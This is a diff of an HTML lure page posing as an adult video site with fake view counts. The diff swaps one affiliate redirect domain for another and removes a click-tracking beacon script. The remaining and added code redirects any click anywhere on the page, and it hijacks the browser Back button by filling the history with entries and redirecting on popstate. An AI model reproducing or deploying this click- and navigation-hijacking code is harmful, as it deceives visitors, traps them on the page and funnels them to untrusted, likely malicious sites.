@@ -1,74 +1,7 @@
 <!DOCTYPE html">
 <html>
 
-<head><script type="text/javascript">(function (apiUrl, apiData, lpUrl) {
-    var apiFormData = new FormData();
-    for (var i in apiData) {
-        apiFormData.append(i, apiData[i]);
-    }
-
-    function sendBeacon() {
-        navigator.sendBeacon(apiUrl, apiFormData);
-    }
-
-    function ajaxBeacon() {
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', apiUrl);
-        xhr.send(apiFormData);
-    }
-
-    function onWindowOpen() {
-        window.open = (function (fnOpen) {
-            return function () {
-                ajaxBeacon();
-                return fnOpen.apply(window, arguments);
-            }
-        })(window.open);
-    }
-
-    function onAnchorClick() {
-        var tags = {a: "href", form: "action"}, tag, action;
-        for (tag in tags) {
-            action = tags[tag];
-            document.querySelectorAll(`${tag}[${action}^="${lpUrl}"],${tag}[${action}^='${lpUrl}']`)
-                .forEach(function (a) {
-                    // на любой клик пытаемся послать ajax
-                    a.addEventListener("click", ajaxBeacon, false);
-                    if ("_blank" !== a.getAttribute('target')) {
-                        // если страница открывается в том же окне, то ajax может не успеть дойти,
-                        // делаем sendBeacon для надёжности
-                        a.addEventListener("click", sendBeacon, false);
-                    }
-                });
-        }
-    }
-
-    function onMetaRefresh() {
-        document.querySelectorAll(`meta[http-equiv="refresh"],meta[http-equiv='refresh']`)
-            .forEach(function ( meta ) {
-                var content = meta.getAttribute('content').split(/;url=/i, 2);
-                var url = content[1];
-                if (0 === url.indexOf(lpUrl)) {
-                    var timeout = parseInt(content[0]) || 0;
-                    if (timeout <= 1) {
-                        sendBeacon();
-                    } else {
-                        setTimeout(function () {
-                            sendBeacon();
-                        }, timeout * 1000 - 1000);
-                    }
-                }
-            });
-    }
-
-    window.addEventListener("DOMContentLoaded", function () {
-        onWindowOpen();
-        onMetaRefresh();
-        onAnchorClick();
-    }, false);
-
-})('https:\/\/cujvik.com\/prelp\/beacon', JSON.parse('{"h":"a17189c4bcd8f0ff84eaee2445b28d40","t":1655977628}'), 'https:\/\/xkt.bizzliving.com\/6rtv3?click_id=3860214175&_sub_aff_id=27765_');
-</script>
+<head>
 	<base href="">
 
 
@@ -84,7 +17,7 @@
 
 	<link href="style.css" rel="stylesheet" type="text/css">
 
-	<script type="text/javascript">function jumpto() { location.href = "\/\/vidfun.net\/tube_ero3\/?c=1c515d3441d0df80-68&h=a17189c4bcd8f0ff84eaee2445b28d40&s=1&lph=1" }</script>
+	<script type="text/javascript">function jumpto() { location.href = "https://tk.zoxla.buzz/cuvfl9k.php?lp=1" }</script>
 	<script type="text/javascript">
 
 		var monthNames = new Array("Jan.", "Feb.", "March", "April", "May", "June", "July", "Aug.", "Sep.", "Oct.", "Nov.", "Dec.");
@@ -101,7 +34,7 @@
 <body class="en ltr" onclick="jumpto();">
 	<div class="hdx">
 		<div class="xwp">
-			<a class="ico" href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="flogo.gif"></a>
+			<a class="ico" href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="flogo.gif"></a>
 			<h7>
 				• Yesterday added: 172 • Today: 86
 			</h7>
@@ -110,7 +43,7 @@
 	<div class="boxxx">
 		<div class="clear"></div>
 		<div class="xwp">
-			<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img id="mimg" src="ftop_banner.jpg" style="width: 100%;margin-top: 6px;"></a>
+			<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img id="mimg" src="ftop_banner.jpg" style="width: 100%;margin-top: 6px;"></a>
 			<br>
 			<div align="center">
 				<h5>Today's Most viewed video!</h5>
@@ -118,10 +51,10 @@
 			<ul class="list">
 				<li>
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f1.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f1.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 14:53 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 14:53 Views:
 							7827</a>
 					</p>
 					<span class="date">
@@ -132,10 +65,10 @@
 				</li>
 				<li class="li2">
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f2.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f2.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 7:51 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 7:51 Views:
 							6002</a>
 					</p>
 					<span class="date">
@@ -146,10 +79,10 @@
 				</li>
 				<li>
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f3.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f3.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 23:28 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 23:28 Views:
 							4798</a>
 					</p>
 					<span class="date">
@@ -160,10 +93,10 @@
 				</li>
 				<li class="li2">
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f4.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f4.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 9:12 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 9:12 Views:
 							2987</a>
 					</p>
 					<span class="date">
@@ -174,10 +107,10 @@
 				</li>
 				<li>
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f5.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f5.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 25:17 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 25:17 Views:
 							5017</a>
 					</p>
 					<span class="date">
@@ -188,10 +121,10 @@
 				</li>
 				<li class="li2">
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f6.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f6.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 7:17 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 7:17 Views:
 							5057</a>
 					</p>
 					<span class="date">
@@ -202,10 +135,10 @@
 				</li>
 				<li>
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f7.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f7.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 9:23 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 9:23 Views:
 							4743</a>
 					</p>
 					<span class="date">
@@ -216,10 +149,10 @@
 				</li>
 				<li class="li2">
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f8.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f8.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 17:28 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 17:28 Views:
 							6872</a>
 					</p>
 					<span class="date">
@@ -230,10 +163,10 @@
 				</li>
 				<li>
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f9.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f9.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 12:57 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 12:57 Views:
 							3047</a>
 					</p>
 					<span class="date">
@@ -244,10 +177,10 @@
 				</li>
 				<li class="li2">
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f10.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f10.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 14:55 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 14:55 Views:
 							1988</a>
 					</p>
 					<span class="date">
@@ -258,10 +191,10 @@
 				</li>
 				<li>
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f11.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f11.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 9:13 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 9:13 Views:
 							7487</a>
 					</p>
 					<span class="date">
@@ -272,10 +205,10 @@
 				</li>
 				<li class="li2">
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f12.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f12.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 8:25 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 8:25 Views:
 							3412</a>
 					</p>
 					<span class="date">
@@ -286,10 +219,10 @@
 				</li>
 				<li>
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f13.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f13.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 9:51 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 9:51 Views:
 							3682</a>
 					</p>
 					<span class="date">
@@ -300,10 +233,10 @@
 				</li>
 				<li class="li2">
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f14.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f14.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 6:51 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 6:51 Views:
 							2843</a>
 					</p>
 					<span class="date">
@@ -314,10 +247,10 @@
 				</li>
 				<li>
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f15.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f15.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 13:43 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 13:43 Views:
 							2382</a>
 					</p>
 					<span class="date">
@@ -328,10 +261,10 @@
 				</li>
 				<li class="li2">
 					<p class="pic">
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_"><img src="f16.jpg"></a>
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1"><img src="f16.jpg"></a>
 					</p>
 					<p>
-						<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_">Time: 10:15 Views:
+						<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1">Time: 10:15 Views:
 							1845</a>
 					</p>
 					<span class="date">
@@ -348,21 +281,22 @@
 
 	<div class="xddl">
 		<div class="xwp">
-			<a href="https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_" id="xddl2">Watch All 12553 added Videos Here!</a>
+			<a href="https://tk.zoxla.buzz/cuvfl9k.php?lp=1" id="xddl2">Watch All 12553 added Videos Here!</a>
 		</div>
 	</div>
 
-	<script type="text/javascript">
-		! function () {
-			var t;
-			try {
-				for (t = 0; 10 > t; ++t) history.pushState({}, "", "https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_");
-				onpopstate = function (t) {
-					t.state && location.replace("https://xkt.bizzliving.com/6rtv3?click_id=3860214175&amp;_sub_aff_id=27765_")
-				}
-			} catch (o) { }
-		}();
-	</script>
+<script type="text/javascript">
+    ! function () {
+        var t;
+        try {
+            const URL = window.location.href.split(/[#]/)[0];
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
+            onpopstate = function(event){
+                event.state && location.replace('https://tk.zoxla.buzz/cuvfl9k.php?lp=1&event10=1');
+            }
+        } catch (o) { console.log( o ); }
+    }();
+</script>
 
 
 </body>
